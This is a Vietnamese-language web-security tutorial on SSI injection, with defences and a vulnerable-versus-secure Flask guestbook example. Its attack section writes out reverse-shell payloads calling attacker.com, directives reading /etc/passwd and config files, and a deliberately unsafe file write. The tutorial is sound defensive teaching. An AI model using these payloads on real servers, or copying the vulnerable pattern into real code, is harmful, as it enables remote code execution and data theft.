# Server-Side Include (SSI) Injection

> **OWASP Top 10:2025**: A05:2025 – Injection | **CWE**: CWE-97 | **Nguồn**: PortSwigger, OWASP, CWE MITRE

## 🧱 Kiến thức Nền tảng

**Server-Side Includes (SSI)** là công nghệ cho phép web server xử lý các **directive** (chỉ thị) được nhúng trực tiếp trong file HTML trước khi gửi response cho client. SSI ra đời từ thời kỳ đầu của web (trước khi có PHP, ASP) và vẫn được hỗ trợ bởi Apache (`mod_include`), Nginx (`ngx_http_ssi_module`), và IIS.

Các file sử dụng SSI thường có phần mở rộng `.shtml`, `.stm`, hoặc `.shtm`. Cú pháp SSI sử dụng HTML comment đặc biệt:

```html
<!-- Normal SSI directives in a .shtml file -->

<!-- Display current date -->
<!--#echo var="DATE_LOCAL" -->

<!-- Include content from another file -->
<!--#include file="header.html" -->

<!-- Include output of a CGI script -->
<!--#include virtual="/cgi-bin/counter.cgi" -->

<!-- Display file size -->
<!--#fsize file="document.pdf" -->

<!-- Execute a system command and embed output -->
<!--#exec cmd="uptime" -->
```

Khi web server nhận request cho file `.shtml`, nó parse toàn bộ nội dung, tìm các directive `<!--#...-->`, thực thi chúng, và thay thế bằng kết quả trước khi trả về cho client. Client chỉ nhận HTML thuần — không thấy SSI directive.

Ví dụ trang web sử dụng SSI để hiển thị footer động:

```html
<!-- page.shtml — using SSI for dynamic footer -->
<html>
<body>
  <h1>Welcome</h1>
  <p>Main content here...</p>
  <footer>
    <!-- SSI directive to include shared footer -->
    <!--#include file="footer.html" -->
    <!-- Display last modified time -->
    <p>Last updated: <!--#echo var="LAST_MODIFIED" --></p>
  </footer>
</body>
</html>
```

## 🔍 Mô tả lỗ hổng

SSI Injection xảy ra khi ứng dụng web nhúng user input vào file được xử lý bởi SSI engine mà không sanitize các directive. Nếu attacker chèn SSI directive vào input (tên, comment, profile field), và output được lưu hoặc render trong file `.shtml`, server sẽ thực thi directive đó.

Directive nguy hiểm nhất là `<!--#exec cmd="..." -->` — cho phép thực thi lệnh hệ thống tùy ý, dẫn đến **Remote Code Execution (RCE)**. Ngay cả khi `exec` bị disable, attacker vẫn có thể sử dụng `<!--#include -->` để đọc file nhạy cảm.

## ⚔️ Cơ chế tấn công

**RCE qua exec directive**:

```html
<!-- Attacker submits this as their "name" in a form -->
<!--#exec cmd="id" -->

<!-- If rendered in .shtml page, server executes 'id' command -->
<!-- Output: uid=33(www-data) gid=33(www-data) groups=33(www-data) -->
```

**Reverse shell**:

```html
<!-- Attacker injects reverse shell command -->
<!--#exec cmd="nc -e /bin/bash attacker.com 4444" -->

<!-- Alternative using bash redirect -->
<!--#exec cmd="bash -i >& /dev/tcp/attacker.com/4444 0>&1" -->
```

**Đọc file nhạy cảm qua include directive**:

```html
<!-- Read /etc/passwd via include -->
<!--#include virtual="/etc/passwd" -->

<!-- Read application config -->
<!--#include file="../config/database.yml" -->
```

**Liệt kê thông tin server**:

```html
<!-- Extract server environment variables -->
<!--#echo var="DOCUMENT_ROOT" -->
<!--#echo var="SERVER_SOFTWARE" -->
<!--#echo var="REMOTE_ADDR" -->

<!-- Print all environment variables -->
<!--#printenv -->
```

## 🛡️ Biện pháp phòng thủ

1. **Disable SSI**: Nếu không sử dụng, tắt hoàn toàn `mod_include` trong Apache hoặc `ssi off` trong Nginx.
2. **Disable `exec` directive**: Trong Apache, sử dụng `Options +IncludesNOEXEC` để cho phép SSI nhưng cấm exec.
3. **HTML-encode user input**: Encode ký tự `<`, `>`, `!`, `#`, `-` trước khi render trong `.shtml`.
4. **Không lưu user input vào .shtml files**: Tách biệt static SSI template và dynamic user data.
5. **Chuyển sang công nghệ hiện đại**: Sử dụng template engine (Jinja2, EJS, Blade) thay vì SSI.

## 💻 Code Example

```python
# === VULNERABLE CODE ===
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/guestbook', methods=['POST'])
def guestbook():
    name = request.form.get('name')
    message = request.form.get('message')

    # DANGER: User input written directly to .shtml file
    with open('/var/www/html/guestbook.shtml', 'a') as f:
        f.write(f"<p><b>{name}</b>: {message}</p>\n")

    return "Message posted!"
# Attack: name=<!--#exec cmd="cat /etc/passwd" -->


# === SECURE CODE ===
import html
from flask import Flask, request

app = Flask(__name__)

def sanitize_ssi(text):
    """Remove SSI directives and HTML-encode the input"""
    # HTML-encode to neutralize < > characters
    safe_text = html.escape(text, quote=True)
    return safe_text

@app.route('/guestbook', methods=['POST'])
def guestbook():
    name = request.form.get('name', '')
    message = request.form.get('message', '')

    # Validate input length
    if len(name) > 50 or len(message) > 500:
        return "Input too long", 400

    # Sanitize all user input before writing
    safe_name = sanitize_ssi(name)
    safe_message = sanitize_ssi(message)

    # Write to regular .html file instead of .shtml
    # Even if SSI is enabled, .html files are not parsed by default
    with open('/var/www/html/guestbook.html', 'a') as f:
        f.write(f"<p><b>{safe_name}</b>: {safe_message}</p>\n")

    return "Message posted!"
```

## 📚 Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/server-side-template-injection
- OWASP: https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
- CWE: https://cwe.mitre.org/data/definitions/97.html
